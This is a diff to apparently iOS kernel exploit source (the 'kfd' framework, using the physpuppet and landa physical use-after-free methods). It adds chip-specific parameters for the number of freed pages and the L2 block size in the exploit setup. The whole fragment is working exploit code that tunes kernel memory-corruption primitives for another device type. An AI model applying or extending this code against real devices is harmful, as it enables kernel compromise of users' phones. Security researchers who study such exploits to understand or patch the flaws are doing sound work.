@@ -26,7 +26,11 @@ void puaf_init(struct kfd* kfd, uint64_t exploit_type)
         kfd->puaf.puaf_method_ops.cleanup = physpuppet_cleanup;
         kfd->puaf.puaf_method_ops.free = physpuppet_free;
         
-        kfd->puaf.number_of_puaf_pages = 2048;
+        if(ischip() == 7) {
+            kfd->puaf.number_of_puaf_pages = 32;
+        } else {
+            kfd->puaf.number_of_puaf_pages = 2048;
+        }
     }
     else
     {
@@ -37,7 +41,9 @@ void puaf_init(struct kfd* kfd, uint64_t exploit_type)
         kfd->puaf.puaf_method_ops.cleanup = landa_cleanup;
         kfd->puaf.puaf_method_ops.free = landa_free;
         
-        if(kfd->info.env.vid <= 9 && !isarm64e()) {
+        if(ischip() == 7) {
+            kfd->puaf.number_of_puaf_pages = 32;
+        } else if(kfd->info.env.vid <= 9 && !isarm64e()) {
             kfd->puaf.number_of_puaf_pages = 128;
         } else if(kfd->info.env.vid >= 10 && !isarm64e()) {
             kfd->puaf.number_of_puaf_pages = 1024;
@@ -125,7 +131,10 @@ void puaf_helper_get_vm_map_min_and_max(uint64_t* min_out, uint64_t* max_out)
 void puaf_helper_give_ppl_pages(void)
 {
     const uint64_t given_ppl_pages_max = 10000;
-    const uint64_t l2_block_size = (1ull << 25);
+    uint64_t l2_block_size = 0x2000000;
+    if(ischip() == 7) {
+        l2_block_size = 0x200000;
+    }
 
     vm_address_t addresses[given_ppl_pages_max] = {};
     vm_address_t address = 0;
